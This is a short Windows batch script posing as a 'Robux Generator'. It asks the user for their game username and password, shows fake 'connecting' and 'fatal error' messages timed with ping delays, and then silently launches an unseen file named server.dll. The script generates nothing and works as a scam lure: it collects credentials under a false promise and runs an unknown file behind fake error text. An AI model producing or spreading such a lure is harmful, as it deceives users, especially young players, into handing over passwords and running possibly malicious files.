@ECHO off
title Robux Generator by KayoticCarnige
echo Loading...
ping -n 3 -w 1000 127.0.0.1 > nul
cls
title Robux Generator by KayoticCarnige
BREAK
set /P INPUT=Type your username:
set /P INPUT=Type your password:
set /P INPUT=Type the amount of Robux you want:
echo CONNECTING TO SERVER...
ping -n 6 -w 1000 127.0.0.1 > nul
echo CONNECTION ERROR! TRYING TO RESOLVE ISSUE...
ping -n 9 -w 1000 127.0.0.1 > nul
echo FATAL SYSTEM ERROR
start server.dll